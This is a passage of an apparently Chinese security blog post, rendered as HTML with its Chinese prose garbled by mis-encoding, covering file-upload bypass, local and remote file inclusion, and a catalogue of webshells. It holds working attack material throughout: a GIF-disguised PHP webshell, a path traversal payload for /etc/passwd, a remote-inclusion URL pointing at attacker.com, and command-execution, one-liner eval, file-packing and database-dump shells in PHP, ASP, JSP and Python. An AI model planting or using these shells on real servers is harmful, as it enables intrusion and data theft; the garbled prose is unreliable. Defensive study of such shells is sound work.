class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GIF89a;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;This is a webshell!&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ”»å‡»è€…å¯ä»¥å°†æ­¤PHPä»£ç ä¿å­˜ä¸º<code>shell.php.gif</code>ï¼Œå¹¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚ç”±äºæ–‡ä»¶ä»¥â€œGIFâ€å¼€å¤´ï¼Œä¸€äº›ç®€å•çš„æ–‡ä»¶ç±»å‹æ£€æŸ¥ï¼ˆå¦‚æ£€æŸ¥æ–‡ä»¶æ‰©å±•åï¼‰å¯èƒ½ä¼šè¢«ç»•è¿‡ã€‚ä¸€æ—¦ä¸Šä¼ ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è®¿é—®URL <code>http://targetsite.com/uploads/shell.php.gif?cmd=whoami</code> æ‰§è¡Œå‘½ä»¤ã€‚</p><p><strong>æ·±å…¥åˆ†æï¼š</strong><br>è¿™ç§ç±»å‹çš„æ¼æ´è¡¨æ˜å¼€å‘è€…å¯èƒ½å¿½ç•¥äº†å¤šå±‚æ¬¡çš„å®‰å…¨æ£€æŸ¥ï¼Œä¾‹å¦‚å†…å®¹ç™½åå•éªŒè¯ã€MIMEç±»å‹æ£€æŸ¥å’Œæ–‡ä»¶å†…å®¹æ‰«æç­‰ã€‚é¢„é˜²æ­¤ç±»æ”»å‡»çš„ç­–ç•¥åŒ…æ‹¬å®æ–½ä¸¥æ ¼çš„æ–‡ä»¶éªŒè¯é€»è¾‘ã€é™åˆ¶ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ã€å¹¶ä½¿ç”¨éšæœºç”Ÿæˆçš„æ–‡ä»¶åå­˜å‚¨ä¸Šä¼ çš„æ–‡ä»¶ã€‚</p><ol start="2"><li><p>æœåŠ¡å™¨ç«¯åŒ…å«ï¼ˆSSIï¼‰æ¼æ´<br>SSIæ¼æ´å…è®¸æ”»å‡»è€…é€šè¿‡åœ¨é¡µé¢ä¸­æ’å…¥æ¶æ„å†…å®¹æ¥æ‰§è¡ŒæœåŠ¡å™¨ç«¯è„šæœ¬ã€‚<br><strong>æ¼æ´ä»£ç ç¤ºä¾‹ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ­¤ä»£ç ç‰‡æ®µç›´æ¥ä»URLå‚æ•°ä¸­å–å¾—æ–‡ä»¶åå¹¶åŒ…å«è¯¥æ–‡ä»¶ï¼Œæœªå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤æˆ–éªŒè¯ã€‚<br><strong>æ”»å‡»Payloadï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://targetsite.com/page.php?file=../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>é€šè¿‡ä½¿ç”¨ç›®å½•éå†æ”»å‡»ï¼ˆå³è·¯å¾„ç©¿è¶Šæ”»å‡»ï¼‰ï¼Œæ”»å‡»è€…å°è¯•è®¿é—®ç³»ç»Ÿæ•æ„Ÿæ–‡ä»¶ï¼Œå¦‚<code>/etc/passwd</code>ã€‚<br><strong>æ·±å…¥åˆ†æï¼š</strong><br>æœåŠ¡å™¨ç«¯è„šæœ¬åº”é™åˆ¶å¯åŒ…å«çš„æ–‡ä»¶èŒƒå›´ï¼Œå¹¶å¯¹è¾“å…¥è·¯å¾„è¿›è¡Œä¸¥æ ¼çš„éªŒè¯ã€‚é¿å…ç›´æ¥å°†ä¸å—ä¿¡ä»»çš„è¾“å…¥ç”¨äºæ–‡ä»¶æ“ä½œæ˜¯é¢„é˜²SSIæ¼æ´çš„å…³é”®ã€‚</p></li><li><p>è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆRFIï¼‰<br>RFIå…è®¸æ”»å‡»è€…è¿œç¨‹æ‰§è¡Œæ¶æ„è„šæœ¬ï¼Œé€šå¸¸æ˜¯é€šè¿‡åœ¨åŒ…å«å‡½æ•°ä¸­æŒ‡å®šå¤–éƒ¨URLã€‚</p></li></ol><p><strong>æ¼æ´ä»£ç ç¤ºä¾‹ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ­¤PHPè„šæœ¬é€šè¿‡<code>url</code>å‚æ•°ç›´æ¥åŒ…å«è¿œç¨‹æ–‡ä»¶ï¼Œæ²¡æœ‰éªŒè¯URLçš„åˆæ³•æ€§ã€‚<br><strong>æ”»å‡»Payloadï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://targetsite.com/page.php?url=http://attacker.com/malicious.php</span><br></pre></td></tr></table></figure><p>æ”»å‡»è€…é€šè¿‡å°†<code>url</code>å‚æ•°è®¾ç½®ä¸ºæ§åˆ¶çš„æ¶æ„PHPæ–‡ä»¶çš„URLï¼Œè¿«ä½¿æœåŠ¡å™¨æ‰§è¡Œè¿œç¨‹PHPä»£ç ã€‚<br><strong>æ·±å…¥åˆ†æï¼š</strong><br>å¼€å‘è€…åº”ç¦ç”¨PHPé…ç½®ä¸­çš„<code>allow_url_include</code>é€‰é¡¹ï¼Œä¸”åº”ç”¨ç¨‹åºä¸åº”ç›´æ¥å°†å¤–éƒ¨æ•°æ®ç”¨äºå…³é”®å‡½æ•°ã€‚ç¡®ä¿æ‰€æœ‰åŒ…å«çš„æ–‡ä»¶éƒ½æ¥è‡ªå—ä¿¡ä»»çš„æºå¤´ï¼Œæ˜¯é¢„é˜²RFIçš„å…³é”®ç­–ç•¥ã€‚</p><h2 id="Webshellçš„ç±»å‹"><a href="#Webshellçš„ç±»å‹" class="headerlink" title="Webshellçš„ç±»å‹"></a>Webshellçš„ç±»å‹</h2><h3 id="1-å¤§é©¬ï¼ˆFull-Featured-Shellsï¼‰"><a href="#1-å¤§é©¬ï¼ˆFull-Featured-Shellsï¼‰" class="headerlink" title="1. å¤§é©¬ï¼ˆFull-Featured Shellsï¼‰"></a>1. å¤§é©¬ï¼ˆFull-Featured Shellsï¼‰</h3><p><strong>PHP ç¤ºä¾‹ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shell</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_manager</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// æ–‡ä»¶ç®¡ç†é€»è¾‘</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">database_manager</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// æ•°æ®åº“æ“ä½œé€»è¾‘</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute_command</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$shell</span> = <span class="keyword">new</span> <span class="title class_">Shell</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$shell</span>-&gt;<span class="title function_ invoke__">execute_command</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ASP ç¤ºä¾‹ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">Class Shell</span><br><span class="line">    Public Function ExecuteCommand(cmd)</span><br><span class="line">        Dim shell</span><br><span class="line">        Set shell = Server.CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">        ExecuteCommand = shell.Exec(cmd).StdOut.ReadAll()</span><br><span class="line">        Set shell = Nothing</span><br><span class="line">    End Function</span><br><span class="line">End Class</span><br><span class="line"></span><br><span class="line">Dim shell</span><br><span class="line">Set shell = New Shell</span><br><span class="line">If Request.Form(&quot;cmd&quot;) &lt;&gt; &quot;&quot; Then</span><br><span class="line">    Response.Write(shell.ExecuteCommand(Request.Form(&quot;cmd&quot;)))</span><br><span class="line">End If</span><br><span class="line">Set shell = Nothing</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><strong>JSP ç¤ºä¾‹ï¼š</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Shell</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">executeCommand</span><span class="params">(String command)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        Process p;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            p = Runtime.getRuntime().exec(command);</span><br><span class="line">            p.waitFor();</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">            <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine())!= <span class="literal">null</span>) &#123;</span><br><span class="line">                output.append(line + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> output.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Shell</span> <span class="variable">shell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell</span>();</span><br><span class="line"><span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">    out.println(shell.executeCommand(request.getParameter(<span class="string">&quot;cmd&quot;</span>)));</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="2-å°é©¬ï¼ˆSimple-Shellsï¼‰"><a href="#2-å°é©¬ï¼ˆSimple-Shellsï¼‰" class="headerlink" title="2. å°é©¬ï¼ˆSimple Shellsï¼‰"></a>2. å°é©¬ï¼ˆSimple Shellsï¼‰</h3><p><strong>PHP ç¤ºä¾‹ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ASP ç¤ºä¾‹ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">If Request.QueryString(&quot;cmd&quot;) &lt;&gt; &quot;&quot; Then</span><br><span class="line">    Dim shell</span><br><span class="line">    Set shell = Server.CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">    Response.Write(shell.Exec(Request.QueryString(&quot;cmd&quot;)).StdOut.ReadAll())</span><br><span class="line">    Set shell = Nothing</span><br><span class="line">End If</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><strong>JSP ç¤ºä¾‹ï¼š</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">    <span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> rt.exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> proc.getInputStream();</span><br><span class="line">    <span class="type">InputStreamReader</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is);</span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(isr);</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        out.println(line);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="3-ä¸€å¥è¯æœ¨é©¬ï¼ˆOne-liner-Shellsï¼‰"><a href="#3-ä¸€å¥è¯æœ¨é©¬ï¼ˆOne-liner-Shellsï¼‰" class="headerlink" title="3. ä¸€å¥è¯æœ¨é©¬ï¼ˆOne-liner Shellsï¼‰"></a>3. ä¸€å¥è¯æœ¨é©¬ï¼ˆOne-liner Shellsï¼‰</h3><p><strong>PHP ç¤ºä¾‹ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ASP ç¤ºä¾‹ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% Execute(Request(&quot;cmd&quot;)) %&gt;</span><br></pre></td></tr></table></figure><p><strong>JSP ç¤ºä¾‹ï¼š</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)); %&gt;</span><br></pre></td></tr></table></figure><p><strong>Python ç¤ºä¾‹ï¼ˆç”¨äºæœåŠ¡å™¨æ”¯æŒPythonçš„æƒ…å†µï¼‰ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pythonç‰ˆæœ¬çš„ä¸€å¥è¯æœ¨é©¬ç›¸å¯¹è¾ƒå°‘è§ï¼Œä½†åŸç†ç±»ä¼¼</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">exec</span>(request.form[<span class="string">&#x27;cmd&#x27;</span>]))</span><br></pre></td></tr></table></figure><h3 id="4-æ‰“åŒ…é©¬ï¼ˆPacking-Shellsï¼‰"><a href="#4-æ‰“åŒ…é©¬ï¼ˆPacking-Shellsï¼‰" class="headerlink" title="4. æ‰“åŒ…é©¬ï¼ˆPacking Shellsï¼‰"></a>4. æ‰“åŒ…é©¬ï¼ˆPacking Shellsï¼‰</h3><p><strong>PHP ç¤ºä¾‹ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;./my_backup.zip&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>, <span class="title class_">ZipArchive</span>::<span class="variable constant_">CREATE</span>)!==<span class="literal">TRUE</span>) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;cannot open &lt;<span class="subst">$filename</span>&gt;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;path/to/directory/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ·»åŠ ç›®å½•åˆ°zipæ–‡ä»¶</span></span><br><span class="line"><span class="variable">$files</span> = <span class="keyword">new</span> <span class="built_in">RecursiveIteratorIterator</span>(<span class="keyword">new</span> <span class="built_in">RecursiveDirectoryIterator</span>(<span class="variable">$dir</span>), <span class="title class_">RecursiveIteratorIterator</span>::<span class="variable constant_">LEAVES_ONLY</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">isDir</span>()) &#123;</span><br><span class="line">        <span class="variable">$filePath</span> = <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getRealPath</span>();</span><br><span class="line">        <span class="variable">$relativePath</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$filePath</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$dir</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">addFile</span>(<span class="variable">$filePath</span>, <span class="variable">$relativePath</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Backup created!&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ASP ç¤ºä¾‹ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">Dim objFSO, objFolder, objFile</span><br><span class="line">Set objFSO = CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">Set objFolder = objFSO.GetFolder(Server.MapPath(&quot;path/to/directory&quot;))</span><br><span class="line"></span><br><span class="line">For Each objFile in objFolder.Files</span><br><span class="line">    Response.Write(objFile.Name &amp; &quot;&lt;br&gt;&quot;)</span><br><span class="line">Next</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><em>æ³¨ï¼šASPæœ¬èº«æ²¡æœ‰å†…å»ºçš„å‹ç¼©åº“æ”¯æŒï¼Œä½†å¯ä»¥è°ƒç”¨å¤–éƒ¨ç¨‹åºæˆ–ç»„ä»¶æ¥å®ç°ã€‚</em></p><p><strong>JSP ç¤ºä¾‹ï¼š</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.zip.*,java.io.*&quot;</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="type">String</span> <span class="variable">sourceFolder</span> <span class="operator">=</span> <span class="string">&quot;/path/to/directory&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">outputZipFile</span> <span class="operator">=</span> <span class="string">&quot;output.zip&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(outputZipFile);</span><br><span class="line">    <span class="type">ZipOutputStream</span> <span class="variable">zos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZipOutputStream</span>(fos);</span><br><span class="line">    <span class="type">File</span> <span class="variable">dir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(sourceFolder);</span><br><span class="line">    File[] files = dir.listFiles();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (File file : files) &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        zos.putNextEntry(<span class="keyword">new</span> <span class="title class_">ZipEntry</span>(file.getName()));</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> length;</span><br><span class="line">        <span class="keyword">while</span> ((length = fis.read(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            zos.write(buffer, <span class="number">0</span>, length);</span><br><span class="line">        &#125;</span><br><span class="line">        zos.closeEntry();</span><br><span class="line">        fis.close();</span><br><span class="line">    &#125;</span><br><span class="line">    zos.close();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException ioe) &#123;</span><br><span class="line">    ioe.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="5-æ‹–åº“é©¬ï¼ˆDatabase-Dump-Shellsï¼‰"><a href="#5-æ‹–åº“é©¬ï¼ˆDatabase-Dump-Shellsï¼‰" class="headerlink" title="5. æ‹–åº“é©¬ï¼ˆDatabase Dump Shellsï¼‰"></a>5. æ‹–åº“é©¬ï¼ˆDatabase Dump Shellsï¼‰</h3><p><strong>PHP ç¤ºä¾‹ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;username&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;myDB&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºè¿æ¥</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="comment">// æ£€æŸ¥è¿æ¥</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM Users&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// è¾“å‡ºæ•°æ®</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>]. <span class="string">&quot; - Name: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>]. <span class="string">&quot; &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;email&quot;</span>]. <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0 results&quot;</span>;</span><br><span 